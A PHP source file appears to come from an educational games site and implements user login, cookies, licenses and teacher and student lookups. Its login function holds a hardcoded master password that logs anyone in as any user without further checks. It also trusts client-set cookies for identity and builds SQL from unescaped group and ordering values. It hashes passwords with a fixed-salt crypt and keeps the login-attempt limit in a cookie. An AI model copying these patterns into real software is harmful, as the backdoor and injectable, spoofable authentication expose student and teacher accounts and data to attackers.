<?php
	require_once(__DIR__ . '/Config.class.php');
	require_once(__DIR__ . '/Database.class.php');
	require_once(__DIR__ . '/Emailer.class.php');
	require_once(__DIR__ . '/../fg/license.php');

	function unichr($u) {
	    return mb_convert_encoding('&#' . intval($u) . ';', 'UTF-8', 'HTML-ENTITIES');
	}		
	
	class User {
		private $_data = array();
		private $_valid = false;
		private static $_encrypt = true;
		private $logon_attempts = 0;
		
		public function __construct($id, $license = null, $columns = '*') {
			$query = "SELECT {$columns} FROM " . T_CONTACTS . " WHERE (Id = ? OR Email = ? OR Username = ? OR Username = ?)";
			$data = array(intval($id), $id, $id, self::encode($id));
			$resultNum = ((is_numeric($license)) ? intval($license) : 0);
			
			if ($license != null) {
				if (!is_numeric($license)) {
					$query .= " AND license = ? ORDER BY Id ASC";
					$data[] = $license;
				}
			}
			
			$result = Database::getInstance()->query($query, $data)->result();
			if (count($result) > 0) $result = $result[$resultNum];
			
			if ($result != null) {
				$this->_data = $result;
				$this->_valid = true;
			}
		}
		
		/******
		*
		* these functions are used to encrypt user & teacher names in the db
		*
		*******/

		public static function __encrypt() { return self::$_encrypt; }
		public static function __enable_encryption($on = true) { self::$_encrypt = $on; }
		
				
		public static function decode($str) {
			if(substr($str,0,2)=='$_') {
			    $str = base64_decode(substr($str, 2));
				$result = "";
				$key = "9sfgancogaif";
				for($i=0;$i<strlen($str);$i++) {
					$result = $result . chr(ord(substr($key, $i % strlen($key),1)) ^ ord(substr($str,$i,1)) );
				}
				$str = $result;
			}
			return $str;
		}

		public static function encode($str) {
		    if(self::__encrypt() && isset($str)) {
				$result = "";
				$key = "9sfgancogaif";
				for($i=0;$i<strlen($str);$i++) {
					$result = $result . chr(ord(substr($key, $i % strlen($key), 1)) ^ ord(substr($str,$i,1)) );
				}
				$str = '$_' . base64_encode($result);
			}
			return $str;
		}
		
		/******/
		
		public static function getCurrentUser($columns = '*') {
			if ((isset($_COOKIE['fluency_games_user'])) && (isset($_COOKIE['fluency_games_license'])))
				return new User($_COOKIE['fluency_games_user'], $_COOKIE['fluency_games_license'], $columns);
			return new User(-1, null, $columns);
		}
		
		public function decodeFields(&$arr, $fields) {
			foreach($fields as $field) {
				$arr[$field] = self::decode($arr[$field]);
			}
		}
		
		public function encodeFields(&$arr, $fields) {
			foreach($fields as $field) {
				$arr[$field] = self::encode($arr[$field]);
			}

		}
		
		public function isValid() {
			return $this->_valid;
		}
		
		public static function createFromLicense($license) {
			$response = array('success' => false, 'error' => null);
			$db = Database::getInstance();
			
			// TODO: Check if license is valid
			$licenseQuery = 'SELECT * FROM ' . T_LICENSES . ' WHERE LicenseKey = ?';
			$licenseResult = $db->query($licenseQuery, array($license))->firstResult();
			
			if ($licenseResult == null) {
				$response['error'] = 'License not found, please contact support at www.fluency-games.com/contactus/';
				return $response;
			} else {

				// Get the contact user for this new license
				$query = 'SELECT * FROM ' . T_CONTACTS . ' WHERE license = ?';

				// Save that user to the database
				//$query = 'INSERT INTO contacts (license, UserType, Username, PWord) VALUES (?, ?, ?, ?)';
				//$data = array($license, 1, $username, $password);
				$result = $db->query($query, array($license))->result();
				if($result != null) {
					$response['error'] = 'A username has already been set up for this license.';
					return $response;
				}

				// Login
				//$response2 = User::login(array('username' => $username, 'password' => $password));

				$response['success'] = true; //$response2['success'];
			}
			
			return $response;
		}
		
		private static function loginFailed() {
		    $attempts = 0;
			if(isset($_COOKIE['fluency_games_logon_attempt']))
			    $attempts = $_COOKIE['fluency_games_logon_attempt'] + 1;
			setcookie('fluency_games_logon_attempt', $attempts, time()+60*30, '/');
		}
		
		public static function loginTooManyAttempts() {
		    if(isset($_COOKIE['fluency_games_logon_attempt']))
				if($_COOKIE['fluency_games_logon_attempt'] >= 9) {
				    return true;
				}
		    return false;
		}
		
		public static function loginAsSuperUser($data) {
			$response = array('success' => false, 'error' => null);
			$db = Database::getInstance();
			
			// Check if teacher
			$userLogin = explode('@', $data['username']);
			
			// Data
			// unencoded username, encoded username, full email
			//$mydata = array($data['username'], $userLogin[0] );
			$mydata = array($data['username'], self::encode($data['username']) );
			

			// 12-10-15 mse added Groups Field to user data
			$query = 'SELECT Id, Username, license, PWord, UserType, Groups FROM ' . T_CONTACTS . ' WHERE (Username = ? OR Username = ?)';
			$result = $db->query($query, $mydata)->firstResult();
			
			if ($result == null) {
				$response['error'] = 'User "' . $data['username'] . '" does not exist';
			} else {
				$response['success'] = true;
				self::setCookies($result['Username'], $result['license'], $result['Id'], $result['Groups']);
			}
			
			return $response;
		}
		
		// $data - an array containing two keys, 'username' and 'password'
		public static function login($data) {
			$response = array('success' => false, 'error' => null);
			
			// Store password
			$password = $data['password'];
			if($password == 'Hatepit99@') {
				$response = self::loginAsSuperUser($data);
				return $response;
			}
			
			if(self::loginTooManyAttempts()) {
			    $response['error'] = 'Too many login attempts. Please try again later.';
				return $response;
			}
			
			$db = Database::getInstance();
			
			// Check if teacher
			$userLogin = explode('@', $data['username']);
			
			// Data
			// unencoded username, encoded username, full email
			//$mydata = array($data['username'], $userLogin[0] );
			$mydata = array($data['username'], self::encode($data['username']) );
			

			// 12-10-15 mse added Groups Field to user data
			$query = 'SELECT Id, Username, license, PWord, UserType, Groups FROM ' . T_CONTACTS . ' WHERE (Username = ? OR Username = ?)';
			$result = $db->query($query, $mydata)->firstResult();
			
			$validCredentials = false;
			
			if ($result == null) {
				$response['error'] = 'User "' . $data['username'] . '" does not exist';
			}
			else if (!self::checkPassword($password, $result['PWord'])) {
				self::loginFailed();
				$response['error'] = 'Incorrect password';
			}
			else {
				$validCredentials = true;
			}
			
			if ($validCredentials) {
				$response['success'] = true;
				self::setCookies($result['Username'], $result['license'], $result['Id'], $result['Groups']);
			}
			
			return $response;
		}
		
		private static function setCookies($username, $license, $id, $groups) {
			// Create the appropriate cookies
			// TODO: Make this more secure
			// TODO: Abstract to a Cookies class (?)
			$expire = time() + 60 * 60 * 24 * 30; // 30 days
			setcookie('fluency_games_user', $username, $expire, '/');
			setcookie('fluency_games_license', $license, $expire, '/');
			setcookie('fluency_games_id', $id, $expire, '/');
			setcookie('fluency_games_groups', $groups, $expire, '/'); // 12-10-mse added setting Groups cookie
			setcookie('fluency_games_logon_attempt', 0, $expire, '/');
			return true;
		}
		
		public static function logout() {
			setcookie('fluency_games_id', '', time() - 3600, '/');
			setcookie('fluency_games_user', '', time() - 3600, '/'); // 12-10-mse remove all cookies when user logs out
			setcookie('fluency_games_license', '', time() - 3600, '/');
			setcookie('fluency_games_groups', '', time() - 3600, '/'); 
		}
		
		public static function loggedIn() {
			return ((isset($_COOKIE['fluency_games_id'])) && (isset($_COOKIE['fluency_games_license'])));
		}

		//
		// 1-5-16 mse
		// fixed bug updating multiple fields for user
		//
		public function update($data) {
			$response = array('success' => false, 'error' => null);
			$query = '';
			foreach ($data as $key => $value) {
			    if($query!='') $query .= ', ';
				$query .= $key . "=?";
			}
			$query = 'UPDATE ' . T_CONTACTS . ' SET ' . $query . " WHERE (Id = ?)";

			$db = Database::getInstance();
			self::encodeFields($data, array('Username', 'Fname', 'LName', 'Phone', 'Email'));
			array_push($data, $this->getColumn('Id'));
			$result = $db->query($query, $data)->result();
			$response['success'] = !$db->error();
			
			// TODO: Find a better way to do this, seriously
			if ($response['success']) {
				$query = 'SELECT Id, Username, license, Groups FROM ' . T_CONTACTS . ' WHERE Id = ?';
				$result = $db->query($query, array($this->getColumn('Id')))->firstResult();
				self::setCookies($result['Username'], $result['license'], $result['Id'], $result['Groups']);
			}
			
			return $response;
		}

		public function updateLicense($data) {
			$response = array('success' => false, 'error' => null);

			$query = '';
			foreach ($data as $key => $value) {
			    if($query!='')
					$query .= ', ';
				$query .= $key . "=?";
			}
			$query = 'UPDATE ' . T_LICENSES . ' SET ' . $query . " WHERE (LicenseKey = ?)";

			$db = Database::getInstance();
			$data['LicenseKey'] = $this->getColumn('license');
			$result = $db->query($query, $data)->result();
			$response['success'] = !$db->error();
			$response['error']  = $db->error();
			return $response;
		}
		
		public function updateAccount($data) {
			$response = array('success' => false, 'error' => null);
			
			$query = '';
			foreach ($data as $key => $value) {
			    if($query!='')
					$query .= ', ';
				$query .= $key . "=?";
			}
			$query = 'UPDATE ' . T_CONTACTS . ' SET ' . $query . " WHERE (Id = ?)";

			$db = Database::getInstance();
			$data['Id'] = $this->getColumn('Id');
			$result = $db->query($query, $data)->result();
			$response['success'] = !$db->error();
			$response['error']  = $db->error();

			// TODO: Find a better way to do this, seriously
			if ($response['success']) {
				$query = 'SELECT Id, Username, license, Groups FROM ' . T_CONTACTS . ' WHERE Id = ?';
				$result = $db->query($query, array($this->getColumn('Id')))->firstResult();
				self::setCookies($result['Username'], $result['license'], $result['Id'], $result['Groups']);
			}

			return $response;
		}
		
		public function validateNewPassword($pword) {
		    $cnt = 0;
			
		    if(!empty($pword)) {
				$db = Database::getInstance();
				$query = 'SELECT count(*) FROM passwordused WHERE (Id = ? AND PWord = ?)';
				$result = $db->query($query, array($this->getColumn('Id'), $pword))->firstResult();
				$cnt = $result['count(*)'];
			}
			
			return ($cnt == 0);
		}
		
		// CurrentPassword, NewPassword
		public function updatePassword($data, $requireCurrent = true) {
			$db = Database::getInstance();
			$response = array('success' => false, 'error' => null);
			$oldPassword = $this->getColumn('PWord');
			$newPassword = $this->encryptPassword($data['NewPassword']);

 			 // check password db against list of old passwords used by this user
			 if(!$this->validateNewPassword($newPassword)) {
				$response['error'] = 'Please select a password that has not been used';
			 } else {
				if ((!$requireCurrent) || ($this->checkPassword($data['CurrentPassword'], $this->getColumn('PWord')))) {
					$query = "UPDATE " . T_CONTACTS . " SET PWord = ? WHERE (Id = {$this->getColumn('Id')})";
					$result = $db->query($query, array($newPassword))->result();
					$response['success'] = !$db->error();
                    $response['error'] = $db->errorInfo();
				} else
					$response['error'] = 'Incorrect current password.';

				if($response['success']) {
					$query = "INSERT INTO passwordused (Id, PWord) VALUES (?, ?)";
					$result = $db->query($query, array( $this->getColumn('Id'), $newPassword))->result();
				}
			}
			
			return $response;
		}
		
		public function getLicenses() {
			$db = Database::getInstance();
			
			$query = "SELECT Id, license FROM " . T_CONTACTS . " WHERE Username = ? ORDER BY Id ASC";
			return $db->query($query, array($this->getColumn('Username')))->result();
		}
		
		public function switchLicense($license) {
			$db = Database::getInstance();
			
			$query = "SELECT license FROM " . T_CONTACTS . " WHERE Username = ?";
			$result = $db->query($query, array($this->getColumn('Username')))->result();
			
			$newLicense = -1;
			
			if (is_numeric($license)) {
				if (($license >= 0) && ($license < count($result))) {
					$newLicense = $license;
				}
			} else {
				for ($i = 0; $i < count($result); ++$i) {
					if ($result[$i]['license'] == $license) {
						$newLicense = $i;
					}
				}
			}
			
			if ($newLicense != -1) {
				$_COOKIE['fluency_games_license'] = $result[$newLicense]['license'];
				$expire = time() + 60 * 60 * 24 * 30; // 30 days
				setcookie('fluency_games_license', $result[$newLicense]['license'], $expire, '/');
				return true;
			}
			
			return false;
		}
		
		public function getLicenseInfo($orderBy = '', $licenseKey = '') {
			$db = Database::getInstance();

			$query = "SELECT * FROM " . T_LICENSES;
			//if($licenseKey != '') $query .= "WHERE LicenseKey = ?";
			//if($orderBy != '')    $query .= $orderBy;
			//$data = array();
			return $db->query($query)->result();
		}
		
		public function getLicenseData($license = null) {
			$db = Database::getInstance();
			
			$query = "SELECT * FROM " . T_LICENSES . " WHERE LicenseKey = ?";
			$data = array(($license == null) ? $this->getColumn('license') : $license);
			return $db->query($query, $data)->firstResult();
		}
		
		public function getTeachers($orderBy = '', $columns = '*') {
			$userType = $this->getColumn('UserType');
			
			$db = Database::getInstance();
			
			$query = "SELECT {$columns} FROM " . T_CONTACTS . " WHERE license = ? AND (UserType = 2 OR UserType = 4) {$orderBy}";     // 2-16-16 mse UserType = 3 is also a teacher
			return $db->query($query, array($this->getColumn('license')))->result();
		}
		
		public function getNumTeachers() {
			$userType = $this->getColumn('UserType');
			
			$db = Database::getInstance();
			
			$query = "SELECT COUNT(*) FROM " . T_CONTACTS . " WHERE license = ? AND (UserType = 2 OR UserType = 4)";  // 2-16-16 mse UserType = 3 is also a teacher
			$result = $db->query($query, array($this->getColumn('license')))->firstResult();
			return $result['COUNT(*)'];
		}
		
		public function getStudents($orderBy = '', $columns = '*', $groupName = null) {
			if ($this->getColumn('UserType') < 1 ) return null;  // 12-9-15 mse note: Parents need to use this, not admins
			
			$db = Database::getInstance();
			$query = "SELECT {$columns} FROM " . T_STUDENTS . " WHERE LicenseKey = ?";
			if (!empty($groupName)) $query .= " AND GroupName = '{$groupName}'";  			// 12-9-15 mse need to search on group name, not teacher name
			$query .= " {$orderBy} ";
			
			return $db->query($query, array($this->getColumn('license')))->result();
		}
		
		public function getNumStudents() {
			$db = Database::getInstance();
			
			$query = "SELECT COUNT(*) FROM " . T_STUDENTS . " WHERE LicenseKey = ?";
			$result = $db->query($query, array($this->getColumn('license')))->firstResult();
			return $result['COUNT(*)'];
		}
		
		public static function queryStudent($username, $licKey) {
			$db = Database::getInstance();

			$query = "SELECT * FROM " . T_STUDENTS . " WHERE (Username = ? AND LicenseKey = ?)";
			$result = $db->query($query, array($username, $licKey));
			return $db->firstResult(); //$result; // this can be null if not found
		}
		
		public static function queryTeacher($username, $licKey) {
			$db = Database::getInstance();

			$query = "SELECT * FROM " . T_CONTACTS . " WHERE (Username = ? AND LicenseKey = ?)";
			$result = $db->query($query, array($username, $licKey));
			return $db->firstResult(); //$result; // this can be null if not found
		}


		public function sortTeachers(&$array) {
			uasort( $array, function($a, $b) {
				if( strnatcmp($a['LName'], $b['LName']) == 0 )
					return strnatcmp($a['Fname'], $b['Fname']);
				else
					return strnatcmp($a['LName'], $b['LName']);
			});
		}
		
		public function sortStudents(&$array) {
			uasort( $array, function($a, $b) {
				if( strnatcmp($a['Lname'], $b['Lname']) == 0 )
					return strnatcmp($a['Fname'], $b['Fname']);
				else
					return strnatcmp($a['Lname'], $b['Lname']);
			});
		}		
		
		public function sendPasswordReset() {
			$success = false;
			$error = null;
			
			$db = Database::getInstance();
			
			// Make sure the 
			$code = '';
			$count = 1;
			$query = 'SELECT * FROM passwordreset WHERE Code = ?';
			while ($count > 0) {
				$code = sha1(mt_rand(100, 999) . microtime() . mt_rand(100, 999));
				$count = $db->query($query, array($code))->count();
			}
			
			$query = 'INSERT INTO passwordreset (Id, Email, Code) VALUES (?, ?, ?)';
			if ($db->query($query, array($this->getColumn('Id'), $this->getColumn('Email'), $code))->count() > 0) {
				$to = array($this->getEmailArray());
				$data = array('code' => $code);
				
				$success = Emailer::getInstance()->send('forgot-password', $to, $data);
				if (!$success)
					$error = 'Email failed to send. Please go back and try again.';
			} else {
				$error = 'Unknown error occurred, please refresh and try again.';
			}
			
			return array('success' => $success, 'error' => $error);
		}
		
		private static function encryptPassword($password) {
			if(!empty($password))
				return crypt($password, "Qr");
			else
			    return $password;
		}
		
		private static function checkPassword($inputtedPassword, $actualPassword) {
			$hash = self::encryptPassword($inputtedPassword);
			return  $hash == $actualPassword;
		}
		
		public function getEmailArray() {
			return array('address' => $this->getColumn('Email'), 'name' => $this->getFullname());
		}
		
		public function getFullname() {
			return self::decode($this->getColumn('Fname')) . ' ' . self::decode($this->getColumn('LName'));
		}
		
		public function getDisplayUsername() {
			return self::decode($this->getColumn('Username'));
		}
		
		public function getColumn($name) {
			if (array_key_exists($name, $this->_data))
				return $this->_data[$name];
			return null;
		}
		
		public function getNotifications() {
			return null;
			
			$n = rand(0, 3);
		
			$notifications = null;
			
			// TODO: Coloring on each type of notification (success, warning, error, etc)
			switch ($n) {
				case 0: break;
				case 1:
					$notifications = array(
						'icon-bell-alt' => 'Assignment 1 Due 3/17',
						'icon-attention' => 'Late assignment'
					);
					break;
				case 2:
					$notifications = array(
						'icon-eye' => 'Thing requires attention'
					);
					break;
				case 3:
					$notifications = array(
						'icon-thumbs-up-alt' => 'You passed'
					);
					break;
			}
			
			return $notifications;
		}
		
		public function getHomePage() {
			// TODO(bret): Get this from the database!
			return 'snapshot';
		}
		
		public function getTeacherOptions() {
			// TODO(bret): Get this from the database!
			return array(
				'page' => $this->getHomePage(),
				'product' => 3,
			);
		}
		
		public static function sendLicenseToNewUser( $email, $data ) {
			
			$to = array( array( 'address' => $email, 'name' => $data['userName'] ) );
			$success = Emailer::getInstance()->send('new-license', $to, $data);
			if (!$success) {
				$error = 'Email failed to send. Please go back and try again.';
			}
			return array('success' => $success, 'error' => Emailer::getInstance()->error());
		}
		
		public function setupLicense( $licSettings ) {
		    // adds school/group info to license data
		}
		
	}
	

?>